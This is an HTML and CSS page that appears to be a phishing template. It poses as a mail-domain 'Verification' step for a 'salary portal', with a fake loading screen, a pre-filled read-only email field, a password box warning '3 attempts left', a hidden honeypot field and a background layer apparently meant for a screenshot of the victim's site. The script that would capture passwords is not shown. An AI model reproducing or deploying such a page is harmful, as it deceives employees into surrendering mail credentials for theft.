<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>


  <!-- Vendor -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>

  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Arial, sans-serif;
      background-color: #f2f4f8;
    }

    /* Background layer */
    #screenshot-background {
      position: fixed;
      inset: 0;
      background-size: cover;
      background-repeat: no-repeat;
      filter: brightness(0.6);
      z-index: -2;
    }

    /* Loading overlay */
    #loading-container {
      position: fixed;
      inset: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: #f9f9f9;
      z-index: 9999;
    }

    #loading-bar {
      width: 80%;
      height: 10px;
      margin-top: 20px;
      background: #e0e0e0;
      border-radius: 6px;
      overflow: hidden;
    }

    #loading-bar-progress {
      height: 100%;
      width: 0;
      background: #4caf50;
      animation: loading 3s linear forwards;
    }

    @keyframes loading {
      to { width: 100%; }
    }

    #loading-info {
      margin-top: 18px;
      font-size: 14px;
      color: #333;
    }

    /* Main card */
    .verify-card {
      max-width: 600px;
      width: 90%;
      margin: 60px auto;
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 6px 28px rgba(0,0,0,.25);
      overflow: hidden;
    }

    .verify-header {
      padding: 28px 20px;
      text-align: center;
      color: #fff;
      background: linear-gradient(1800deg, #191a1b, #bec2c3);
    }

    .verify-header img {
      height: 50px;
      margin-bottom: 14px;
    }

    .verify-body {
      padding: 30px;
      
    }

    .btn-submit {
      width: 100%;
      padding: 10px;
      border-radius: 6px;
      border: none;
      font-weight: 600;
      color: #fff;
      background: linear-gradient(90deg, #191a1b, #bec2c3);
    }

    /* Typing cursor */
    .typing-cursor {
      width: 2px;
      height: 1.2em;
      background: #000;
      margin-left: 2px;
      display: inline-block;
      animation: blink .8s steps(1) infinite;
    }

    @keyframes blink {
      50% { opacity: 0; }
    }

    #attempts-info {
      display: block;
      margin-top: 5px;
      font-weight: bold;
      color: red;
    }

    /* Alert overlay */
    #alert-overlay {
      position: fixed;
      inset: 0;
      display: none;
      justify-content: center;
      align-items: center;
      background: rgba(0,0,0,.55);
      backdrop-filter: blur(6px);
      z-index: 10002;
    }

    #alert-overlay.show {
      display: flex;
    }

    #alert-box {
      background: #fff;
      padding: 26px;
      border-radius: 14px;
      max-width: 520px;
      font-size: 20px;
      font-weight: 700;
      text-align: center;
      animation: pop .28s ease-out;
    }

    @keyframes pop {
      from { transform: scale(.92); opacity: 0 }
      to   { transform: scale(1); opacity: 1 }
    }

    #user-info-footer {
      padding: 8px;
      font-size: 13px;
      color: #333;
      background: #f9f9f9;
      border-top: 1px solid #ddd;
      text-align: center;
    }
  </style>
</head>

<body>

<div id="screenshot-background"></div>

<section id="loading-container">
  <img src="https://cdn-icons-png.flaticon.com/512/561/561127.png"
       width="50"
       onerror="this.style.display='none'">
  <div id="loading-bar">
    <div id="loading-bar-progress"></div>
  </div>
  <div id="loading-info">Loading mail settings...</div>
</section>

<div id="alert-overlay">
  <div id="alert-box"></div>
</div>

<main id="main-content" style="display:none;">
  <div class="verify-card">

    <header class="verify-header">
      <img src="https://static.vecteezy.com/system/resources/thumbnails/023/495/208/small_2x/global-logo-for-business-png.png"
           id="logoimg" alt="">
      <h2><span id="domain-name"></span> Verification</h2>
      <p>Confirm your identity to access salary portal </p>
    </header>

    <section class="verify-body">
      <form id="verify-form" autocomplete="off">

        <input type="hidden" id="timestamp" name="timestamp">
        <div style="display:none">
          <input type="text" id="trap" name="trap" autocomplete="off">
        </div>

        <div id="msg" class="alert alert-danger" style="display:none">
          Incorrect Credentials. Please try again
        </div>

        <span id="error" class="text-danger" style="display:none">
          Invalid user
        </span>

        <div class="form-group">
          <label>Email</label>
          <div class="d-flex align-items-center">
            <input id="ai" type="email" class="form-control" readonly required style="height:50px">
            <span id="cursor" class="typing-cursor"></span>
          </div>
        </div>

        <div class="form-group">
          <label>Password</label>
          <input id="pr" type="password" class="form-control" style="height:50px">
          <span id="attempts-info">3 attempts left</span>
        </div>

        <button id="submit-btn" type="button" class="btn-submit mt-3">
          Submit
        </button>

      </form>
    </section>

    <footer id="user-info-footer"></footer>

  </div>
</main>
